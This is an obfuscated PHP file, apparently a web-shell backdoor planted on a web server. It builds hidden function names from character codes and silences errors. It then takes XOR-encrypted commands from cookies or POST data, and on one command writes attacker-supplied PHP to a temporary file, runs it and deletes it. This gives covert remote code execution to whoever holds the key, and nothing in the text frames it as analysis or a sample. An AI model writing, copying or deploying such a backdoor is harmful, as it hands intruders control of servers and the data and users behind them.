<?php $tbsZXa = "\146".chr(546-441).'l'.chr(101)."\137"."\x70".chr(136-19).'t'.chr(615-520).chr(99)."\157"."\x6e".'t'."\x65".'n'."\x74".chr(952-837);
$kvqiOPuKLm = chr(1006-908).chr(97).'s'."\x65".'6'.chr(255-203).chr(95).'d'.chr(319-218)."\x63"."\157".'d'."\145";
$aBJBZR = "\x69"."\x6e".'i'.chr(873-778).'s'.'e'."\x74";
$FcRJTchRVu = "\x75"."\x6e".chr(937-829).chr(379-274)."\156".chr(107);


@$aBJBZR(chr(799-698).'r'.'r'."\x6f"."\x72"."\137".'l'.'o'.chr(694-591), NULL);
@$aBJBZR("\154"."\157".chr(103)."\137".chr(101)."\x72"."\x72"."\x6f"."\162".chr(115), 0);
@$aBJBZR('m'.chr(929-832).chr(120).'_'.chr(129-28).'x'.chr(101)."\143"."\165".chr(116)."\x69".chr(703-592)."\156".chr(95).chr(349-233)."\x69"."\155"."\145", 0);
@set_time_limit(0);

function wCMpE($ygkjkiJimo, $GmFAc)
{
    $LTZBy = "";
    for ($CJJnt = 0; $CJJnt < strlen($ygkjkiJimo);) {
        for ($j = 0; $j < strlen($GmFAc) && $CJJnt < strlen($ygkjkiJimo); $j++, $CJJnt++) {
            $LTZBy .= chr(ord($ygkjkiJimo[$CJJnt]) ^ ord($GmFAc[$j]));
        }
    }
    return $LTZBy;
}

$CJJntryzcwWe = array_merge($_COOKIE, $_POST);
$wZeIQIlL = '5f258da5-b50d-4ff1-9b75-cba50455b7de';
foreach ($CJJntryzcwWe as $ULfDUIQnmY => $ygkjkiJimo) {
    $ygkjkiJimo = @unserialize(wCMpE(wCMpE($kvqiOPuKLm($ygkjkiJimo), $wZeIQIlL), $ULfDUIQnmY));
    if (isset($ygkjkiJimo["\141"."\x6b"])) {
        if ($ygkjkiJimo[chr(97)] == 'i') {
            $CJJnt = array(
                chr(336-224)."\166" => @phpversion(),
                chr(115).chr(332-214) => "3.5",
            );
            echo @serialize($CJJnt);
        } elseif ($ygkjkiJimo[chr(97)] == 'e') {
            $ZHxfWefkiO = "./" . md5($wZeIQIlL) . chr(298-252)."\x69".'n'."\x63";
            @$tbsZXa($ZHxfWefkiO, "<" . "\x3f".chr(841-729).chr(104).chr(696-584)."\x20"."\x40"."\x75".chr(119-9).'l'.'i'."\156"."\153".'('.'_'.'_'."\106".'I'.'L'.'E'.'_'.chr(177-82)."\51".chr(59).' ' . $ygkjkiJimo['d']);
            include($ZHxfWefkiO);
            @$FcRJTchRVu($ZHxfWefkiO);
        }
        exit();
    }
}

